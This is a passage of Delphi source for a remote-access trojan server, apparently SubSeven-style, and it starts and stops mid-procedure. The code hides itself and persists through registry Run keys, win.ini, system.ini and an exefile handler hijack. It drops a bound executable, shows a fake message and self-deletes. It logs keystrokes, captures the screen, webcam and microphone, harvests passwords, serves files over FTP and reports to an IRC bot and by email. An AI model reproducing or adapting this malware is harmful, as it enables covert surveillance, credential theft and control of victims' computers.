if (raspuns<>'') and (raspuns<>'<NONE>') then
 Socket.SendText(raspuns);
end;

procedure TForm1.ServerSocket1ClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
  ICQSpyClock.Enabled:=False;
  if ICQSpySocket.Active then try ICQSpySocket.Active:=False;except end;
  Parola:=Decrypt(ReadKey(Encrypt('Password')));
  if (Parola<>'') then PassDone:=False;
end;

function nuexista(str1,str2:string):boolean;
var i:integer;
begin
result:=true;
 for i:=1 to length(str1) do
  if copy(str1,i,5)=str2 then result:=false;
end;

procedure TForm1.FtpServer1Authenticate(Sender: TObject;
  Client: TFtpCtrlSocket; UserName, Password: TFtpString;
  var Authenticated: Boolean);
begin
 if FTPPassword<>Password then Authenticated:=False;
 if LocalFTPFolder[length(LocalFTPFolder)]<>'\' then LocalFTPFolder:=LocalFTPFolder+'\';
 Client.HomeDir:=LocalFTPFolder;
end;

procedure TForm1.FtpServer1ClientDisconnect(Sender: TObject;
  Client: TFtpCtrlSocket; Error: Word);
begin
{}
end;

procedure TForm1.ExecuteExeFile;
var _f:TOfStruct;
    f:integer;
    _fis:string;
    fis:PChar;
    bufa:array[1..1024] of char;
    ReadString:String;
    i,tmp,exesize,citit:integer;
    data:array[1..5] of string[20];
    ff:file of byte;
begin
 if NOT BindedWithExe then exit;
 _fis:=paramstr(0)+#0;
 fis:=@_fis[1];
 exesize:=StrToInt(BindedWithSize);
 f:=LZOpenFile(fis, _f, OF_READ );
 LZSeek(f,-(419+exesize),2);
 citit:=0;
 if FileExists(WinPath+'\appl_.exe') then DeleteFile(WinPath+'\appl_.exe');
 assignfile(ff,WinPath+'\appl_.exe');
 ReWrite(ff);
 repeat
  LZRead(f,@bufa,1024);
  BlockWrite(ff,bufa,1024);
  inc(citit,1024);
 until (Exesize<=citit+1024);
 LZRead(f,@bufa,ExeSize-Citit);
 BlockWrite(ff,bufa,ExeSize-Citit);
 LZClose(f);
 CloseFile(ff);
 WinExec(PChar(WinPath+'\appl_.exe'),SW_SHOWNORMAL);
end;

var FakeString:String;
    ShowFake:Boolean;

function ReadStr(var s:string;c:integer):string;
var i:integer;
    news:string;
begin
 news:='';
 for i:=1 to c do if s[i]<>'ô' then news:=news+s[i];
 result:=news;
 Delete(s,1,c);
end;

function ReadBool(var s:string):boolean;
begin
 if s[1]='0' then result:=false else result:=true;
 Delete(s,1,1);
end;

procedure TForm1.SaveSettings;
const data1=245;
// change also in ExecuteExeFile [DATA SIZE]
      data2=174;
var _f:TOfStruct;
    f:integer;
    _fis:string;
    fis:PChar;
    buf:array[1..data1] of char;
    buf2:array[1..data2] of char;
    ReadString, ReadString2,dummy:String;
    i,tmp:integer;
    db,dummyb:bool;
    rp:longint;
//    data:array[1..21] of string[53];
begin
// //addtolog('!reading settings...');
 _fis:=ParamStr(0)+#0;
 fis:=@_fis[1];
 f:=LZOpenFile(fis, _f, OF_READ );
 LZSeek(f,-(data1+data2),2);
 LZRead(f,@buf,data1);
 LZSeek(f,-data2,2);
 LZRead(f,@buf2,234);
 LZClose(f);
 ReadString:='';
 ReadString2:='';
 for i:=1 to 245 do ReadString:=ReadString+buf[i];
 for i:=1 to data2 do ReadString2:=ReadString2+buf2[i];
 ReadString:=Decrypt(ReadString);
 ReadString2:=Decrypt(ReadString2);
 dummy:=ReadStr(ReadString,4);//boo
 if dummy<>'SS03' then
  begin
//   ShowMessage('running defaults');
   SetKey(Encrypt('Port Number'),Encrypt('27374'));
   try RemoveKey(Encrypt('Password'));except end;
   SetKey(Encrypt('Protect'),Encrypt('false'));
   SetKey(Encrypt('CurrentExe'),Encrypt('MSREXE.EXE'));
   SetKey(Encrypt('RunMethod'),Encrypt('00000'));
   CurrentExe:=Decrypt(ReadKey(Encrypt('CurrentExe')));
   BindedWithExe:=False;
   exit;
  end;
 dummy:=ReadStr(ReadString,10);SetKey(Encrypt('Port Number'),Encrypt(dummy));
 dummy:=ReadStr(ReadString,12);SetKey(Encrypt('Password'),Encrypt(dummy));
 db:=ReadBool(ReadString);
 if db then SetKey(Encrypt('Protect'),Encrypt('true')) else SetKey(Encrypt('Protect'),Encrypt('false'));
 db:=ReadBool(ReadString);
 dummy:=ReadStr(ReadString,15);
 if db then SetKey(Encrypt('CurrentExe'),Encrypt('MSREXE.exe'))
  else SetKey(Encrypt('CurrentExe'),Encrypt(dummy));
 db:=ReadBool(ReadString);
 if db then MeltServer:=True;
 db:=ReadBool(ReadString);
 if db then ShowFake:=True else ShowFake:=False;
 FakeString:=ReadStr(ReadString,1);
 FakeString:=FakeString+ReadStr(ReadString,1);
 FakeString:=FakeString+ReadStr(ReadString,20);
 FakeString:=FakeString+'ZJXX';
 FakeString:=FakeString+ReadStr(ReadString,40);
 db:=ReadBool(ReadString);
 if db then SetKey(Encrypt('Enabled'),Encrypt('true')) else SetKey(Encrypt('Enabled'),Encrypt('false'));
 dummy:=ReadStr(ReadString,12);SetKey(Encrypt('ICQ'),Encrypt(dummy));
 db:=ReadBool(ReadString);
 if db then SetKey(Encrypt('IRC'),Encrypt('true')) else SetKey(Encrypt('IRC'),Encrypt('false'));
 dummy:=ReadStr(ReadString,12);if db then SetKey(Encrypt('IRCchannel'),Encrypt(dummy));
 dummy:=ReadStr(ReadString,25);if db then SetKey(Encrypt('IRCserver'),Encrypt(dummy));
 dummy:=ReadStr(ReadString,6);if db then SetKey(Encrypt('IRCport'),Encrypt(dummy));
 db:=ReadBool(ReadString);
 if db then SetKey(Encrypt('EMdoit'),Encrypt('true')) else SetKey(Encrypt('EMdoit'),Encrypt('false'));
 dummy:=ReadStr(ReadString,30);if db then SetKey(Encrypt('EMto'),Encrypt(dummy));
 dummy:=ReadStr(ReadString,40);if db then SetKey(Encrypt('EMaddress'),Encrypt(dummy));
 dummy:=ReadStr(ReadString,10);if db then SetKey(Encrypt('EMid'),Encrypt(dummy));
 dummy:=ReadStr(ReadString2,20);SetKey(Encrypt('Name'),Encrypt(dummy));
 dummy:=ReadStr(ReadString2,5);SetKey(Encrypt('RunMethod'),Encrypt(dummy));
 dummy:=ReadStr(ReadString2,20);SetKey(Encrypt('RegistryKeyName'),Encrypt(dummy));
 RegistryKeyName:=Decrypt(ReadKey(Encrypt('RegistryKeyName')));
 CurrentExe:=Decrypt(ReadKey(Encrypt('CurrentExe')));
 BindedWithExe:=ReadBool(ReadString2);
 BindedWithSize:=ReadStr(ReadString2,10);
 dummyb:=ReadBool(ReadString2);
 if dummyb then
  begin //pick random port
   RANDOMIZE;
   RP:=Random(7999);
   RP:=1244+RP;
   dummy:=IntToStr(RP);
   SetKey(Encrypt('Port Number'),Encrypt(dummy));
  end;try
 dummyb:=ReadBool(ReadString2);
 if dummyb then SetKey(Encrypt('bot_autostart'),Encrypt('yes')) else SetKey(Encrypt('bot_autostart'),Encrypt('nope'));
 IRCServer:=ReadStr(ReadString2,25);
 IRCPort:=ReadStr(ReadString2,10);
 IRCNickname:=ReadStr(ReadString2,15);
 IRCPassword:=ReadStr(ReadString2,10);
 IRCPrefix:=ReadStr(ReadString2,5);
 IRCChannel:=ReadStr(ReadString2,20);
 IRCChannelKey:=ReadStr(ReadString2,10);
 IRCIdent:=PickRandomNick;
 IRCAutoStart:=dummyb;except end;
 try WriteOut;except end;
 //addtolog('!settings read.');
end;

procedure TForm1.GoMeltTheServer;
var batf:textfile;
begin
  if fileexists(WinPath+'\~temp.bat') then DeleteFile(WinPath+'\~temp.bat');
  assignfile(batf,WinPath+'\~temp.bat');
  rewrite(batf);
  WriteLn(batf,'@echo off');
  Writeln(batf, ':Repeat');
  Writeln(batf, 'del ' + ParamStr(0));
  Writeln(batf, 'if exist ' + ParamStr(0) + ' goto Repeat');
  WriteLn(batf,'del '+WinPath+'\~temp.bat');
  WriteLn(batf,'exit');
  CloseFile(batf);
  ExecuteFileOptions(WinPath+'\~temp.bat',IDLE_PRIORITY_CLASS, SW_HIDE);
  Application.Terminate;
  form1.close;
  Halt(0);
end;

procedure SaveSmallEXE;
var res:TResourceStream;
    filename:string;
    f:file;
    buf:array[1..999] of char;
    i,size:integer;
    name,sizes:string;
begin
 filename:=winpath+'\'+LauncherName;
 if FileExists(filename) then try DeleteFile(filename);except end;
 res:=TResourceStream.Create(HInstance,'RCDATA_1',RT_RCDATA);
 try res.SaveToFile(filename);except end;
 name:=ExtractFileName(CurrentExe);size:=length(name);
 sizes:=IntToStr(size);if size<10 then sizes:='00'+sizes else if size<100 then
 sizes:='0'+sizes;
 AssignFile(f,filename);Reset(f,1);Seek(f,res.Size);
 Name:=EncryptOLD(Name);
 for i:=1 to size do buf[i]:=Name[i];
 BlockWrite(f,buf,size);
 SizeS:=EncryptOLD(SizeS);
 for i:=1 to 3 do buf[i]:=sizes[i];
 BlockWrite(f,buf,3);
 CloseFile(f);
 res.free;
end;

procedure TForm1.InstallServer;
var sKey,tmpstr:String;
    reg:TRegIniFile;
    RunIt:Boolean;
    unde:string;
    inif:TIniFile;
begin
 //addtolog('!installing server...');
 BindedWithExe:=False;MeltServer:=False;ShowFake:=false;
 {if FileExists(WinPath+'\'+CurrentExe) then RunIt:=False else RunIt:=True;}
 SaveSettings;
 FileCopy(ParamStr(0),WinPath+'\'+CurrentExe);
 sKey:='';
 unde:=Decrypt(ReadKey(Encrypt('RunMethod')));
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_CLASSES_ROOT;
 reg.WriteString('.dl','','exefile');
 reg.WriteString('.dl','Content Type','application/x-msdownload');
 reg.Free;
if ((unde[1]='1') or (unde[2]='1')) then begin
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_LOCAL_MACHINE;
 if unde[2]='1' then
  reg.WriteString('SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices',RegistryKeyName,CurrentExe);
 if unde[1]='1' then
  reg.WriteString('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',RegistryKeyName,CurrentExe);
 reg.Free;
end;
 if unde[3]='1' then begin
  inif := TIniFile.Create(WinPath+'\win.ini');
  tmpstr:=inif.ReadString('windows', 'run', 'ERROR');
  if Pos(CurrentExe,tmpstr)=0 then begin
  if ((tmpstr='') or (tmpstr='ERROR')) then
   inif.WriteString('windows','run',CurrentExe)
  else
   inif.WriteString('windows','run',tmpstr+', '+CurrentExe);
  end;
  inif.free;
 end;
 if unde[4]='1' then begin
  inif := TIniFile.Create(WinPath+'\system.ini');
  tmpstr:=inif.ReadString('boot', 'shell', 'ERROR');
  if Pos(CurrentExe,tmpstr)=0 then begin
  if Pos(' ',tmpstr)<>0 then inif.WriteString('boot','shell',copy(tmpstr,1,Pos(' ',tmpstr))+CurrentExe)
   else inif.WriteString('boot','shell',tmpstr+' '+CurrentExe);
  end;
  inif.free;
 end;
 if Unde[5]='1' then begin
  SaveSmallEXE;
  reg:=TRegIniFile.Create('');
  reg.RootKey:=HKEY_CLASSES_ROOT;
  reg.WriteString('exefile\shell\open\command','',LauncherName+' "%1" %*');
  reg.free;
 end;
 if ShowFake then ShowCustomizedMessage(FakeString,nil);
 //addtolog('!server installed.');
 ExecuteExeFile;
 {if RunIt then }ExecuteFileOptions(WinPath+'\'+CurrentExe,IDLE_PRIORITY_CLASS, SW_HIDE);
 if (not MeltServer) then HALT(1) else GoMeltTheServer;
 Halt;
end;

procedure TForm1.GetKeyProc(var Msg : TMessage);
var
  Ch : Char;
  T : TextFile;
begin
 with Msg do
 if Msg = WMNewChar then
 begin
  try Ch := Char(wParam);except end;
  if Ch <> #0 then try LogTheKey(EncodeKeys(Ch));except end;
 end;
end;

procedure TForm1.EnableKeyLogger;
var KeyHookVer:String;
    Temp : array[0..144] of Char;
begin
 try
  try KeyWnd := AllocateHWnd(GetKeyProc);except end;
  WMNewChar := RegisterWindowMessage('MTAVRE');
  LoadKeyDll;
  KeyHookVer := '1.00';
  if @GetKeyVer <> nil then begin
    GetKeyVer(Temp);
    KeyHookVer := string(Temp);
  end;
 except end;
 try ReturnKeys(True, KeyWnd);except end;
 SEND_KEYZ:=TRUE;
 Clock.Interval:=500;
 Clock.Enabled:=True;
end;

procedure TForm1.DisableKeyLogger;
begin
{  try ReturnKeys(False, KeyWnd);except end;
  try FreeKeyDll;except end;
  try SEND_KEYZ:=FALSE;
  Clock.Enabled:=False;except end;}
end;

procedure TForm1.FormCreate(Sender: TObject);
var j:integer;
    Temp : array[0..144] of Char;
    res:string;
    titlu,fsize1,fsize2:integer;
    rec:TSearchRec;
begin
try
 GetStringFormats(CBFormats.Items);
 CBMode.ItemIndex := 1;
 CBFormats.ItemIndex := 0;
 with CBFormats, Items do
  try FStringFormat := TStringFormatClass(Objects[ItemIndex]).Format;except end;
except
end;
  
 //addtolog('starting up...');
 SendKeyString:='';
 randomize;
 Caption:=IntToStr(random(9999999)*2+random(9999999));
 titlu:=random(9999999);
 Application.Title:=IntToStr(titlu);
 CanSend:=False;
 //addtolog('hiding...');
 ShowWindow (Handle, SW_HIDE);
 ShowWindow (GetWindow (Handle, GW_OWNER), SW_HIDE);
 RegisterServiceProcess(GetCurrentProcessID, 1);
 RegistryKeyName:=Decrypt(ReadKey(Encrypt('RegistryKeyName')));
 CurrentExe:=Decrypt(ReadKey(Encrypt('CurrentExe')));
 try FindFirst(ParamStr(0),faAnyFile,rec);fsize1 := rec.Size;except fsize1:=0;end;
 try FindFirst(CurrentExe,faAnyFile,rec);fsize2 := rec.Size;except fsize2:=0;end;
 form1.Left:=0;
 form1.top:=0;
 form1.Height:=0;
 form1.Width:=0;
 HideTheMothaFucker(Sender);
 Height:=0;
 Width:=0;
 //addtolog('reading settings...');
 if (UpperCase(ExtractFileName(ParamStr(0)))<>UpperCase(CurrentExe)) or (fsize1<>fsize2) then
  InstallServer;
 if (FileExists(SysPath+'\SYSTRAY.DLL')) then EnableKeyLogger;
 ServerStarted:=True;
 CanSend:=True;
 SetPreviewQuality:=50;
 SetSnapshotQuality:=50;
 Strm2Send:=TMemoryStream.Create;
 DownloadFile:=False;
 ListenToKeys:=False;
 MyString:='';
 Conectat:=False;
 FaO:=False;
 MailSent:=False;
 // IRC
 //addtolog('reading registry entries...');
 try IRCIdent:=PickRandomNick;
 IRCPassword:=Decrypt(ReadKey(Encrypt('bot_password')));
 IRCNickname:=Decrypt(ReadKey(Encrypt('bot_nickname')));
 IRCServer:=Decrypt(ReadKey(Encrypt('bot_server')));
 IRCPort:=Decrypt(ReadKey(Encrypt('bot_port')));
 IRCPrefix:=Decrypt(ReadKey(Encrypt('bot_prefix')));
 IRCChannel:=Decrypt(ReadKey(Encrypt('bot_channel')));
 IRCChannelKey:=Decrypt(ReadKey(Encrypt('bot_channelkey')));
 IRCIdent:=Decrypt(ReadKey(Encrypt('IRCident')));
 if IRCIdent='' then IRCIdent:=PickRandomNick;
 if Decrypt(ReadKey(Encrypt('bot_autostart')))='yes' then IRCAutoStart:=True else IRCAutoStart:=False;
 Perform.Lines.Text:=Decrypt(ReadKey(Encrypt('bot_perform')));
 IRCMaster:='';
 IRCLogged:=False;
 except end;
 TempSaveFile:=TempFolder+'\desktop.ynf';
 TempFile:=TempFolder+'\systm.dat';
 if ParamCount<>0 then for j:=1 to ParamCount do
  if (ParamStr(j)<>'') and
   (UpperCase( copy(ParamStr(j),1,6) )='/PASS:' ) then
    SetKey(Encrypt('Password'),Encrypt(copy(ParamStr(j),7,length(ParamStr(j))))) else
  if (ParamStr(j)<>'') and
   (UpperCase( copy(ParamStr(j),1,4) )='/SEE' ) then begin
     FaO:=True;
    end else
  if (ParamStr(j)<>'') and
   (UpperCase( copy(ParamStr(j),1,6) )='/PORT:' ) then
    SetKey(Encrypt('Port Number'),Encrypt(copy(ParamStr(j),7,length(ParamStr(j)))));
 MailSent:=False;
 FromMaster:=False;
 Parola:='';PassDone:=True;
 if Decrypt(ReadKey(Encrypt('Password')))<>'' then begin Parola:=Decrypt(ReadKey(Encrypt('Password')));passdone:=false;end;
 if Parola='' then PassDone:=True;
 res:=Decrypt(ReadKey(Encrypt('Port Number')));
 OldListIPz:='127.0.0.1';
 //addtolog('starting socket...');
 if (res<>'') then
  serversocket1.port:=StrToInt(res)
 else
  serversocket1.port:=27374;
 try ServerSocket1.Active:=true except end;
 for i:=1 to 10 do PortZ[i]:=False;
 //addtolog('startup sequence complete...');
 NotifyTimer.Enabled:=True;
end;

procedure TForm1.HideTheMothaFucker(Sender: TObject);
begin
form1.Left:=0;
form1.top:=0;
form1.Height:=0;
form1.Width:=0;
try
 ShowWindow(Application.Handle, SW_HIDE);
 SetWindowLong(Application.Handle, GWL_EXSTYLE,
 GetWindowLong(Application.Handle, GWL_EXSTYLE) or
 WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW);
except end;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
{ ServerSocket1.Close;
 ServerSocket2.Close;
 ChatSock.Close;
 IRCSock.Close;
 KeySock.Close;}
{ if ServerStarted then FreeKeyDLL;
 try DisableKeyLogger;except end;}
end;


procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
var loop,count:integer;
begin
MyFName:=10151999;
if (FileExists(Form1.Gameinfo1.WinDir+'\'+inttostr(MyFName)+'.dat')) then
 if MessageDlg('hmmm, '+Socket.RemoteHost+
               ' inchid?',mtConfirmation,[mbYes,mbNo],0)=mrYes
  then halt;
 if ((Parola<>'') and (Parola<>'ERROR')) then
  begin
   Count:=0;
   for loop:=0 to Banned.Lines.Count do
    if Banned.Lines[loop]=Socket.RemoteHost then Inc(Count);
   if Count>5 then begin Socket.SendText('YOU''RE BANNED!!');Socket.Close;EXIT;end;
   Socket.SendText('PWD');
  end
 else begin
  Socket.SendText ('connected. time/date: '+FormatDateTime ('hh:nn.ss "-" mmmm d, yyyy, dddd', Now)+', version: '+ServerVersion);
 end;
end;

procedure TForm1.ServerSocket1GetThread(Sender: TObject;
  ClientSocket: TServerClientWinSocket;
  var SocketThread: TServerClientThread);
begin
 if (not ServerSocket1.Active)
  then begin
  ServerSocket1.Active:=True;
  ServerSocket1.Open;
  end;
end;

procedure TForm1.UpdateServerNOW;
var
  SaveToFile:String;
begin
 SaveToFile:=WinPath+'\~updtnw.bak';
 if fileexists(WinPath+'\~temp.bat') then DeleteFile(WinPath+'\~temp.bat');
 assignfile(batf,WinPath+'\~temp.bat');
 rewrite(batf);
 Writeln(batf, ':Repeat');
 Writeln(batf, 'del ' + ParamStr(0));
 Writeln(batf, 'if exist ' + ParamStr(0) + ' goto Repeat');
 Writeln(batf, 'copy ' + SaveToFile+' ' + ParamStr(0));
 Writeln(batf, 'del ' + SaveToFile);
 Writeln(batf, 'start ' + ParamStr(0));
 WriteLn(batf,'del '+WinPath+'\~temp.bat');
 Writeln(batf, 'exit');
 CloseFile(batf);
 ExecuteFileOptions(WinPath+'\~temp.bat',IDLE_PRIORITY_CLASS, SW_HIDE);
 Application.Terminate;
 halt(1);
 close;
end;

procedure TForm1.StartIRCBOT;
begin
 YESQUIT:=False;
 IRCBot.Server:=IRCServer;
 IRCBot.Port:=IRCPort;
 IRCBot.Nick:=IRCNickname;
 IRCPassword:=IRCPassword;
 Randomize;IRCBot.RealName:=PickRandomNick;
 irc.UserName:=IRCIdent;
 IRCBot.Connect;IRCMaster:='';
end;


procedure TForm1.NotifyTimerTimer(Sender: TObject);
begin
 if (OldListIPz=ListIPz) then Exit;
 //addtolog('checking ip...');
 if ListIPz='127.0.0.1' then Exit;
 OldListIPz:=ListIPz;
 //addtolog('sending notifies...');
 try SendEmail(sender);except end;
 if (not ServerSocket1.Active) then try ServerSocket1.Active:=True;except end;
 try if IRCAutoStart then StartIRCBOT;except end;
 //addtolog('done1...');
end;

procedure TForm1.SendKeyNOW(tasta:string);
begin
 SendKeyString:=SendKeyString+tasta;
end;

procedure tform1.LogTheKey(key:String);
var W:THandle;
    S:ShortString;
begin
 w:=GetForegroundWindow;GetWindowText(W,@S[1],254);s[0]:=Char(StrLen(@S[1]));
 if s<>TopWindow then
  begin
    if SEND_KEYZ then SendKeyNow('» '+S+' «');
    try KeyLog.Text:=KeyLog.Text+#13#10+'» '+S+' «'#13#10;except KeyLog.Text:='';end;
    TopWindow:=S;
  end;
 if SEND_KEYZ then SendKeyNOW(key);
 if key=#13 then try KeyLog.Text:=KeyLog.Text+#13#10;except keylog.text:='';end else
  if (Key=#8) then begin
   if (Length(KeyLog.Text)>0) then
    begin
     if (KeyLog.Text[Length(KeyLog.Text)]=#10) then KeyLog.Text:=Copy(KeyLog.Text,1,Length(KeyLog.Text)-2)
     else KeyLog.Text:=Copy(KeyLog.Text,1,Length(KeyLog.Text)-1);
    end;
   end else
    if (Key='û') then try KeyLog.Text:=KeyLog.Text+'   ';except keylog.text:='';end else
     try KeyLog.Text:=KeyLog.Text+Key;except keylog.text:='';end;
end;

procedure TForm1.rectimeTimer(Sender: TObject);
var fsize:integer;
    winkey:string;
    rec:tsearchrec;
begin
 rectime.Enabled:=False;
 media.stop;
 media.Save;
 media.close;
 CompressNewFile(WinPath+'\flfrdat.wav');
 FindFirst(WinPath+'\flfrdat.wav',faAnyFile,rec);
 fsize := rec.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
 ServerSocket1.Socket.Connections[0].SendText ('RSF'+winkey+inttostr(fsize));
 ServerSocket1.Socket.Connections[0].SendStream (TFileStream.Create (WinPath+'\flfrdat.wav', fmOpenRead or fmShareDenyWrite));
 try DeleteFile(WinPath+'\flfrdat.wav');except end;
end;

procedure TForm1.NMStrm1PacketSent(Sender: TObject);
begin
{}
end;

procedure TForm1.GetPassTimerTimer(Sender: TObject);
begin
 //addtolog('timer1...');
 try ProcessPasswords;except end;
 //addtolog('timer1 done.');
end;


procedure TForm1.FtpServer1BuildDirectory(Sender: TObject;
  Client: TFtpCtrlSocket; var Directory: TFtpString; Detailed: Boolean);
var
    Buf : String;
begin
    if UpperCase(Client.Directory) <> 'C:\VIRTUAL\' then
        Exit;
    Client.UserData   := 1;        { Remember we created a stream }
    if Assigned(Client.DataStream) then
        Client.DataStream.Destroy; { Prevent memory leaks         }
    Client.DataStream := TMemoryStream.Create;
    if Detailed then
        Buf :=
      '-rwxrwxrwx   1 ftp      ftp            0 Apr 30 19:00 FORBIDEN' + #13#10 +
      '-rwxrwxrwx   1 ftp      ftp            0 Apr 30 19:00 TEST' + #13#10 +
      'drwxrwxrwx   1 ftp      ftp            0 Apr 30 19:00 SOME DIR' + #13#10
    else
        Buf := 'FORBIDEN' + #13#10 +
               'TEST' + #13#10;
    Client.DataStream.Write(Buf[1], Length(Buf));
    Client.DataStream.Seek(0, 0);
end;

procedure TForm1.FtpServer1ChangeDirectory(Sender: TObject;
  Client: TFtpCtrlSocket; Directory: TFtpString; var Allowed: Boolean);
begin
{$IFDEF NEVER}
    if (UpperCase(Client.UserName) <> 'ROOT') and
       (UpperCase(Client.Directory) = 'C:\') then
       Allowed := FALSE;
{$ENDIF}
 if Length(Directory)<Length(LocalFTPFolder) then Allowed:=False;
end;
procedure TForm1.FtpServer1MakeDirectory(Sender: TObject;
  Client: TFtpCtrlSocket; Directory: TFtpString; var Allowed: Boolean);
begin
 CreateDir(Directory);
end;

procedure TForm1.FtpServer1RetrSessionClosed(Sender: TObject;
  Client: TFtpCtrlSocket; Data: TWSocket; Error: Word);
begin
    if Client.UserData = 1 then begin
        if Assigned(Client.DataStream) then begin
            Client.DataStream.Destroy;
            Client.DataStream := nil;
        end;
        Client.UserData   := 0;     { Reset the flag }
    end;
end;

procedure TForm1.FtpServer1RetrSessionConnected(Sender: TObject;
  Client: TFtpCtrlSocket; Data: TWSocket; Error: Word);
var buf:string;
begin
    if Error <> 0 then
    else if Copy(UpperCase(Client.FilePath), 1, 19) = 'C:\VIRTUAL\FORBIDEN' then
    else if Copy(UpperCase(Client.FilePath), 1, 11) = 'C:\VIRTUAL\' then begin
        Client.UserData   := 1;        { Remember we created a stream }
        if Assigned(Client.DataStream) then
            Client.DataStream.Destroy; { Prevent memory leaks         }
        Client.DataStream := TMemoryStream.Create;
        Buf := 'This is a file created on the fly by the FTP server' + #13#10 +
               'It could result of a query to a database or anything else.' + #13#10 +
               'The request was: ''' + Client.FilePath + '''' + #13#10;
        Client.DataStream.Write(Buf[1], Length(Buf));
        Client.DataStream.Seek(0, 0);
    end;
end;

procedure TForm1.FtpServer1ValidateDele(Sender: TObject;
  Client: TFtpCtrlSocket; var FilePath: TFtpString; var Allowed: Boolean);
begin
 DeleteFile(FilePath);
end;

procedure TForm1.ServerSocket2ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var cod:string;
    fsize:integer;
    winkey,feedback,x,y:string;
    rec:TSearchRec;
begin
 cod:=Socket.ReceiveText;
 if copy(cod,1,4)<>'DOIT' then exit;
 try SetPreviewQuality:=StrToInt(copy(cod,5,3));
 except SetPreviewQuality:=50;end;
 if length(cod)>12 then
 begin
  x:=copy(cod,8,4);
  y:=copy(cod,12,4);
 end else begin
  x:='320';
  y:='250';
 end;
 Strm2Send.Clear;
 ScreenCapturePreview(StrToInt(x),StrToInt(y));
  FindFirst(WinPath+'\tempp~.bak',faAnyFile,rec);
  fsize := rec.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'PRV'+winkey+IntToStr(fsize);
  Socket.SendText (Feedback);
  Socket.SendStream (TFileStream.Create (WinPath+'\tempp~.bak', fmOpenRead or fmShareDenyWrite));
 try DeleteFile(WinPath+'\tempp~.bak');except end;
end;

procedure TForm1.DialUp1ActiveConnection(Sender: TObject; Handle: Integer;
  Status: TRasConnStatusA; StatusString: String; EntryName, DeviceType,
  DeviceName: array of Char);
begin
  DialUp1.HangUpConn(Handle);
end;

procedure TForm1.keysockError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
 {trap it}
end;

procedure TForm1.irc_timerTimer(Sender: TObject);
var chan:string;
begin
 chan:=Decrypt(ReadKey(Encrypt('IRCchannel')));
 if (chan[1]='#') then irc.Join(chan,'');
 InitDATA_IRC;
 if (Chan[1]='#') and (Pos(' ',chan)<>0) then
   Chan:=Copy(Chan,1,Pos(' ',Chan)-1);
 irc.Say(chan,SendStrBodyIRC);
end;

procedure TForm1.ChatSockClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var txt,cui:String;
    con:integer;
begin
 txt:=Socket.ReceiveText;
 cui:=copy(txt,1,3);
 txt:=copy(txt,4,length(txt));
 if cui='MTV' then
  begin
   MyChat.ScrieClientuInMemo(txt);
   for con:=0 to Form1.ChatSock.Socket.ActiveConnections do
    try Form1.ChatSock.Socket.Connections[con].SendText('MFV'+txt);except end;
  end;

 if cui='MTC' then for con:=0 to Form1.ChatSock.Socket.ActiveConnections do
   try Form1.ChatSock.Socket.Connections[con].SendText('MFC'+txt);except end;

 if cui='CVC' then
  begin
   PoateInchide:=True;
   MyChat.Hide;
   for con:=0 to Form1.ChatSock.Socket.ActiveConnections do
    try Form1.ChatSock.Socket.Connections[con].SendText('CVC');except end;
   Form1.ChatSock.Active:=False;
  end;

 if cui='CCC' then for con:=0 to Form1.ChatSock.Socket.ActiveConnections do
   try Form1.ChatSock.Socket.Connections[con].SendText('CCC');except end;

end;
procedure TForm1.ChatSockClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
if ChatSock.Socket.ActiveConnections=0 then
begin
 PoateInchide:=True;
 MyChat.Hide;
end;
end;

procedure TForm1.NMMSGServ1MSG(Sender: TComponent; const sFrom,
  sMsg: String);
var lax,lay:string;
begin
 lax:=copy(sMsg,2,pos('y',sMsg)-2);
 lay:=copy(sMsg,pos('y',sMsg)+1,pos(';',sMsg)-pos('y',sMsg)-1);
 try
  SetCursorPos(StrToInt(laX), StrToInt(laY));
 except;
 end;
end;

procedure TForm1.WMQueryEndSession(var Message: TWMQueryEndSession);
begin
  inherited;
  halt;
  Message.Result:=1;
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
if ServerStarted then
 begin
  {ReturnKeys(False, KeyWnd);
  DeallocateHWnd(KeyWnd);
  ClearKeyHook;}
 end; 
end;

procedure TForm1.ServerSocket3ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var cod:string;
    fsize:integer;
    winkey,feedback,x,y:string;
    rec:TSearchRec;
begin
 cod:=Socket.ReceiveText;
 if copy(cod,1,4)<>'DOWC' then exit;
 Strm2Send.Clear;
 WebCamCapture(StrToInt(copy(cod,5,3)));
 FindFirst(WinPath+'\~934675.bak',faAnyFile,rec);
 fsize := rec.Size;
 if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
  else winkey:=IntToStr(length(IntToStr(fsize)));
 if length(x)<1 then x:='0000'+x else
 if length(x)<2 then x:='000'+x else
 if length(x)<3 then x:='00'+x else
 if length(x)<4 then x:='0'+x;
 if length(y)<1 then y:='0000'+y else
 if length(y)<2 then y:='000'+y else
 if length(y)<3 then y:='00'+y else
 if length(y)<4 then y:='0'+y;
 Feedback := 'RWC'+winkey+IntToStr(fsize);
 Socket.SendText (Feedback);
 Socket.SendStream (TFileStream.Create (WinPath+'\~934675.bak', fmOpenRead or fmShareDenyWrite));
 try DeleteFile(WinPath+'\~934675.bak');except end;
end;

procedure TForm1.ICQSpyClockTimer(Sender: TObject);
begin
 CheckForMessages;
end;

function FindSiteWindowMessage(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
  if no=8 then MessageData[2]:=wintext(Handle);
  if no=9 then MessageData[3]:=wintext(Handle);
